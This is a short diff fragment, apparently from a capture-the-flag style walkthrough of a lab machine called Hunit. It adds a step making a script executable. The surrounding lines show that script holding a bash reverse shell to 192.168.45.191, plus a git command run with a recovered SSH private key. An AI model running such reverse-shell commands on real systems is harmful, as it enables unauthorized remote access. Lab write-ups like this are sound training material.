@@ -2113,6 +2113,9 @@ cat backups.sh
 bash -i >& /dev/tcp/192.168.45.191/18030 0>&1
 ````
 ````
+chmod +x backups.sh
+````
+````
 GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git status            
 On branch master
 Your branch is up to date with 'origin/master'.
